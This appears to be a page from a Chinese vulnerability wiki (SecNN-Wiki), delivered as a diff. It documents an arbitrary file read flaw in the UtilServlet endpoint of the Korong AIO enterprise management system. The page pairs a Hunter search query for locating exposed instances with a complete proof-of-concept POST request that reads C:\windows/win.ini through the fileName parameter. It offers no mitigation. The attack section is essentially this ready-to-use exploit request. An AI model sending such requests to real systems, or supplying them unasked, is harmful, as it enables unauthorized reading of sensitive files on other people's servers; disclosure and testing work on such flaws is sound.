@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUtilServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>科荣 AIO 管理系统 UtilServlet 存在任意文件读取漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u79d1\u8363 AIO \u7ba1\u7406\u7cfb\u7edf UtilServlet \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1", children: [
+          ]},
+          {title: "\u4e8c\u3001\u5f71\u54cd\u7248\u672c", url: "#_2", children: [
+          ]},
+          {title: "\u4e09\u3001\u8d44\u4ea7\u6d4b\u7ed8", url: "#_3", children: [
+          ]},
+          {title: "\u56db\u3001\u6f0f\u6d1e\u590d\u73b0", url: "#_4", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUtilServlet%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUtilServlet%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        科荣 AIO 管理系统 UtilServlet 存在远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        科荣 AIO 管理系统 ReportServlet 存在目录遍历漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="aio-utilservlet">科荣 AIO 管理系统 UtilServlet 存在任意文件读取漏洞<a class="headerlink" href="#aio-utilservlet" title="Permanent link">&para;</a></h1>
+<h1 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>科荣AIO企业一体化管理解决方案,通过ERP（进销存财务）、OA（办公自动化）、CRM（客户关系管理）、UDP（自定义平台），集电子商务平台、支付平台、ERP平台、微信平台、移动APP等解决了众多企业客户在管理过程中跨部门、多功能、需求多变等通用及个性化的问题。科荣 AIO 管理系统存在任意文件读取漏洞，攻击者可以读取敏感文件。</p>
+<h1 id="_2">二、影响版本<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<ul>
+<li>科荣 AIO 管理系统 </li>
+</ul>
+<h1 id="_3">三、资产测绘<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<ul>
+<li>hunter<code>app.name="科荣 AIO"</code></li>
+<li>特征</li>
+</ul>
+<p><img alt="1699631783798-97153184-155c-4762-9c58-b7c8334bc638.png" src="./img/KJn1NI1bH8toct3T/1699631783798-97153184-155c-4762-9c58-b7c8334bc638-007622.png" /></p>
+<h1 id="_4">四、漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<div class="highlight"><pre><span></span><code>POST /UtilServlet HTTP/1.1
+Host: xx.xx.xx.xx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Content-Length: 52
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cache-Control: no-cache
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Pragma: no-cache
+Upgrade-Insecure-Requests: 1
+
+operation=readErrorExcel&amp;fileName=C:\windows/win.ini
+</code></pre></div>
+<p><img alt="1699631836577-be6e6474-29de-4eba-aca2-4b8170c58b0a.png" src="./img/KJn1NI1bH8toct3T/1699631836577-be6e6474-29de-4eba-aca2-4b8170c58b0a-883570.png" /></p>
+<blockquote>
+<p>更新: 2024-02-29 23:55:46<br />
+原文: <a href="https://www.yuque.com/xiaokp7/ocvun2/udgwgxz7zdoguolr">https://www.yuque.com/xiaokp7/ocvun2/udgwgxz7zdoguolr</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUtilServlet%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FUtilServlet%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        科荣 AIO 管理系统 UtilServlet 存在远程命令执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A7%91%E8%8D%A3AIO%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FReportServlet%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        科荣 AIO 管理系统 ReportServlet 存在目录遍历漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
